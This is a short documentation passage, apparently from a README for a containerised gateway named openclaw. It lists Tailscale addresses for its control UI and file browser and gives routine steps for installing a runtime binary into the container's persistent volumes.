- Control UI is available at `https://<device_tailnetdomain>.ts.net#token=<gateway-token>`.
- File Browser is available at `https://<device_tailnetdomain>.ts.net/browse/`.

Runtime install workflow (example):

1. SSH into the gateway: `ssh root@<device_tailnetdomain>.ts.net`
2. Switch to the node user: `su - node`
3. Install your runtime binary using the package manager of choice (e.g. `brew`, `pnpm`, or `uv`).
4. Exit and restart: `docker restart openclaw-<profile>` from the host, or `kill 1` as root inside the container.

Because `/home/node` and `/home/linuxbrew/.linuxbrew` are persistent named volumes, installed binaries and package-manager state persist across container restarts/recreation.
